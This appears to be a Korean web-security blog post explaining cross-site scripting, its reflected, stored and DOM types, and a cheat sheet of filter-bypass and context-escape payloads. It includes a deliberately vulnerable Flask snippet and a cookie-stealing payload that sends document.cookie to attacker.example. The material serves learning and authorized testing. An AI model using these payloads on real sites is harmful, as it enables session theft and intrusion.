---
title: "XSS (Cross-Site Scripting)"
date: 2026-10-15 09:00:00 +0900
categories: [Web Security, XSS]
tags: [xss, web, client-side]
description: "사용자 입력이 스크립트로 실행되는 XSS의 개념과 반사·저장·DOM 유형, 그리고 태그·이벤트 핸들러·인코딩·컨텍스트 탈출을 이용한 필터 우회 구문을 정리합니다."
mermaid: true
---

> XSS는 사용자 입력이 페이지에 스크립트로 삽입되어 피해자 브라우저에서 실행되는 취약점이다. 공격자는 세션 탈취, 화면 변조, 피해자 권한의 요청 전송을 할 수 있다.

## 개념

서버나 클라이언트가 사용자 입력을 HTML에 넣을 때, 출력 위치에 맞는 인코딩을 하지 않으면 입력이 데이터가 아니라 **코드로 해석**된다.

```python
@app.route("/search")
def search():
    q = request.args.get("q", "")
    return f"<h1>검색: {q}</h1>"   # q가 그대로 HTML에 들어간다
```

`q`에 `<script>...</script>`를 넣으면 그대로 실행된다. 유형은 입력이 어디서 들어오고 어디서 나가는지로 나뉜다.

- **반사형(Reflected)**: 요청에 담긴 입력이 그 응답에 바로 출력된다.
- **저장형(Stored)**: 입력이 저장됐다가 다른 사용자 화면에 출력된다. 영향이 가장 크다.
- **DOM 기반**: 서버를 거치지 않고 클라이언트 자바스크립트가 `location`, `innerHTML` 등으로 입력을 DOM에 쓴다.

핵심은 **출력 컨텍스트**다. 같은 입력도 HTML 본문, 속성값(`"..."`), 스크립트 블록, URL 안에서 각각 다르게 해석되므로, 어디에 반사되는지에 따라 필요한 구문이 달라진다. 필터가 특정 문자열만 지우는 방식이면 컨텍스트 하나가 새는 순간 뚫린다.

## 공격·우회 구문

대상은 `example.com`, 외부 수집 지점은 `attacker.example`로 일반화했다. 영향 증명은 무해한 `alert(1)`로 충분하다. 점검은 허가된 범위에서만 한다.

### 기본 실행

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### 태그·이벤트 핸들러 필터 우회

```html
<svg/onload=alert(1)>          <!-- 공백 대신 / -->
<svg onload=alert`1`>          <!-- 괄호 대신 백틱 -->
<ImG src=x OnErroR=alert(1)>   <!-- 대소문자 혼합 -->
```

속성명 중간에 탭·개행을 넣어 키워드 필터를 피한다(브라우저는 무시):

```html
<img src=x o	nerror=alert(1)>
<a href="jav	ascript:alert(1)">클릭</a>
```

### 인코딩으로 1차 필터 회피

```
&lt; &#60; &#x3c;     <!-- < 를 엔티티로 -->
&quot; &#34;          <!-- " 를 엔티티로 -->
%3C %22               <!-- URL 인코딩 -->
```

### 컨텍스트 탈출

반사 위치가 속성값·스크립트 블록·이벤트 핸들러 안이면 먼저 그 컨텍스트를 닫는다.

```
"><svg onload=alert(1)>     <!-- 속성값("...") 안에서 -->
';alert(1);//               <!-- <script> 문자열 안에서 -->
');alert(1);//              <!-- 이벤트 핸들러 값 안에서 -->
```

### 세션 영향 증명

PoC는 쿠키를 외부로 보내는 대신 접근 가능 여부만 확인한다. 실제 외부 전송(`attacker.example`)은 보고용 증명 이상으로 쓰지 않는다.

```html
<img src=x onerror="new Image().src='//attacker.example/?c='+document.cookie">
```

### 진단 순서

1. 무해한 고유 문자열(`zq7test`)을 넣어 어디에 반사되는지 확인한다(본문·속성·스크립트·URL).
2. `< > " '`가 변환되어 나오는지 본다. 그대로면 인코딩이 없는 것이다.
3. 필터가 삭제인지 변환인지 거부인지 구분한다. 삭제면 1회 치환 여부를 확인한다.
4. 반사된 컨텍스트에 맞는 구문으로 좁힌다.

## 참고 자료

- [OWASP: Cross Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
- [OWASP XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
